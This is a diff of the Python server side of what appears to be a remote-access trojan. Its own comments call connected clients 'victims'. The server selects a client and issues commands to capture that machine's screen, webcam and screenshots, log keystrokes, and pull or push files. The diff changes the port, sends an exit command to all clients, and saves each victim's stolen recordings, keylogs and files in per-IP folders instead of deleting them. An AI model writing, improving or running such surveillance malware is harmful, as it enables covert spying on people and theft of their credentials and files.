@@ -37,7 +37,7 @@ def create_socket():
         global port  # global variable storing port on which server will be listening
         global s     # global variable for socket on which server will be listening
         host=""      # initialize with static ip of server
-        port=5050    # any port number which is not reserved port(greater than 1023)
+        port=9999    # any port number which is not reserved port(greater than 1023)
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # creating a socket object- AF_INET-refers to IPv4 address family, 
         #                                                       SOCK_STREAM- use connection-oriented TCP protocol,SOCK_DGRAM- UDP connection
 
@@ -120,12 +120,18 @@ def start_KD():
         # select command -> it will be used to select a connected client by using client id
         # KD> select 0 -> select client_id
         elif cmd.split(' ')[0]== "select":
-            conn=get_target(cmd)    # get_target() helps us to select client specified in command by passing input to it and return the corresponding connection object
+            cl=get_target(cmd)    # get_target() helps us to select client specified in command by passing input to it and return the corresponding connection object
 
-            if conn:  # to check that client is still connected and didn't get disconnected in mean time i.e conn is not None
-                send_target_commands(conn) # function to send commands to the target/selected victim
+            if cl:  # to check that client is still connected and didn't get disconnected in mean time i.e conn is not None
+                send_target_commands(cl[0],cl[1]) # function to send commands to the target/selected victim
 
         elif cmd == "exit":       # to exit from server program
+            for conn in all_connections:
+                try:
+                    conn.send('exit'.encode())
+                except:
+                    pass
+                
             break
 
         elif cmd == "help":    # to print info about all valid commands
@@ -163,7 +169,7 @@ def get_target(cmd):
         print("You are now connected to " + str(all_address[client_id][0]))
         print(str(all_address[client_id][0]) + "> ",end="")   # In shell you will be getting output like 192.168.29.1> which will indicate that you are now
                                                        # connected to client and you can now send commands to the client
-        return conn                     # return connection object of target
+        return conn,all_address[client_id][0]+'-'+str(all_address[client_id][1])                     # return connection object of target
 
     except:                                  # if client id mentioned is not present then error is reported
         print("Selected client id not valid")
@@ -171,14 +177,14 @@ def get_target(cmd):
 
 
 # to display recording
-def show_video(filepath):
+def show_video(filepath,ip):
     vid=cv2.VideoCapture(filepath)
     window_name=""
     SCREEN_SIZE=None
-    if filepath == 'screen.avi':
+    if filepath == os.path.join(ip,'screen.avi'):
         window_name="LiveScreen"
         SCREEN_SIZE=pyautogui.size()
-    elif filepath == "webcam2.avi":
+    elif filepath == os.path.join(ip,"webcam2.avi"):
         window_name="WebcamFeed"
         vid2=cv2.VideoCapture(0,cv2.CAP_DSHOW)
         width = int(vid2.get(cv2.CAP_PROP_FRAME_WIDTH))
@@ -199,11 +205,11 @@ def show_video(filepath):
     cv2.destroyAllWindows()
 
 # to get screen recording of target machine - rec command
-def screenCapture(conn):
+def screenCapture(conn,ip):
     print("capturing..")
     l=int(conn.recv(20480).decode())
     conn.send("start".encode())
-    f=open("screen.avi","wb")
+    f=open(os.path.join(ip,"screen.avi"),"wb")
     curr_len=0
     while curr_len<l:
         print("",end="\r")
@@ -216,19 +222,18 @@ def screenCapture(conn):
     f.close()
     print("\ndone..")
     conn.send("done".encode())
-    show_video('screen.avi')
-    os.remove('screen.avi')
+    show_video(os.path.join(ip,'screen.avi'),ip)
     output=conn.recv(10240).decode()
     print(output,end="")
 
 # to capture webcam feed of target - webcam command
-def webcamCapture(conn):
+def webcamCapture(conn,ip):
     conn.send('capture'.encode())
     l=int(conn.recv(20480).decode())
     if l>0:
         print("capturing..")
         conn.send("start".encode())
-        f=open("webcam2.avi","wb")
+        f=open(os.path.join(ip,"webcam2.avi"),"wb")
         curr_len=0
         while curr_len<l:
             print("",end="\r")
@@ -241,8 +246,7 @@ def webcamCapture(conn):
         f.close()
         print("\ndone..")
         conn.send("done".encode())
-        show_video('webcam2.avi')
-        os.remove('webcam2.avi')
+        show_video(os.path.join(ip,'webcam2.avi'),ip)
     else:
         print('Error accessing webcam...')
         conn.send('Error'.encode())
@@ -251,23 +255,23 @@ def webcamCapture(conn):
 
 
 # to display screenshot of target machine
-def show_image():
-    im=cv2.imread('ss.jpg')
+def show_image(ip):
+    im=cv2.imread(os.path.join(ip,'ss.jpg'))
     SCREEN_SIZE=pyautogui.size()
     cv2.namedWindow("Screenshot",cv2.WINDOW_NORMAL)
     cv2.resizeWindow("Screenshot",SCREEN_SIZE[0],SCREEN_SIZE[1])
     cv2.imshow("Screenshot",im)
-    cv2.waitKey(0)
+    cv2.waitKey(3000)
     cv2.destroyAllWindows()
 
 
 # to get screenshot of target machine - ss command
-def screenshot(conn):
+def screenshot(conn,ip):
     print("clicking")
     l=int(conn.recv(20480).decode())
     conn.send("start".encode())
     curr_len=0
-    f=open("ss.jpg","wb")
+    f=open(os.path.join(ip,"ss.jpg"),"wb")
 
     while curr_len<l:
         print("",end="\r")
@@ -279,13 +283,12 @@ def screenshot(conn):
     f.close()
     print("\ndone")
     conn.send("done".encode())
-    show_image()
-    os.remove("ss.jpg")
+    show_image(ip)
     output=conn.recv(20480).decode()
     print(output,end="") 
 
 # to get file from target machine - getfile filepath command
-def getfile(conn,cmd):
+def getfile(conn,cmd,ip):
     filepath=cmd.split(" ")[1]
     conn.send('capture'.encode())
     l=int(conn.recv(20480).decode())
@@ -296,7 +299,7 @@ def getfile(conn,cmd):
         print("Extracting file")
         conn.send("start".encode())
         filename=os.path.basename(filepath)
-        f=open(filename,"wb")
+        f=open(os.path.join(ip,filename),"wb")
         curr_len=0
         while curr_len<l:
             print(end="\r")
@@ -343,7 +346,7 @@ def sendfile(conn,cmd):
     print(output,end="")
 
 # to log keys at client side and recieve log file - keylogger command
-def keyLogger(conn):
+def keyLogger(conn,ip):
     print("Logging keys...")
     conn.send("log".encode())
     res=conn.recv(1024).decode()
@@ -353,7 +356,7 @@ def keyLogger(conn):
     l=int(conn.recv(20480).decode())
     print("Extracting logs")
     conn.send("start".encode())
-    f=open("logs.txt","w")
+    f=open(os.path.join(ip,"logs.txt"),"w")
     curr_len=0
     while curr_len<l:
         print(end="\r")
@@ -368,7 +371,12 @@ def keyLogger(conn):
     print(output,end="")
 
 # Function for sending commands to target machine
-def send_target_commands(conn):
+def send_target_commands(conn,ip):
+    try:
+        os.mkdir(os.path.join(os.getcwd(),ip))
+    except Exception as e:
+        pass
+        #print(e)
     while True:  # An infinite loop is written so that we are able to send multiple commands before closing connection
         try:
             cmd=input() # Take input command from user in variable cmd
@@ -390,25 +398,25 @@ def send_target_commands(conn):
                                                                # conn.recv() return data in bytes which needs to be converted in utf-8 format anf then converted to str format
             
             if client_response == "Logging_keys":
-                keyLogger(conn)
+                keyLogger(conn,ip)
                 continue         
 
 
             if client_response == "capturing":
-                screenCapture(conn)
+                screenCapture(conn,ip)
                 continue
 
             if client_response == "clicking":
-                screenshot(conn)
+                screenshot(conn,ip)
                 continue
 
             if client_response == "capturing_webcam" :
-                print("Function call debug")
-                webcamCapture(conn)
+                #print("Function call debug")
+                webcamCapture(conn,ip)
                 continue
 
             if client_response == "sending_file":
-                getfile(conn,cmd)
+                getfile(conn,cmd,ip)
                 continue
 
             if client_response == "receiving_file":
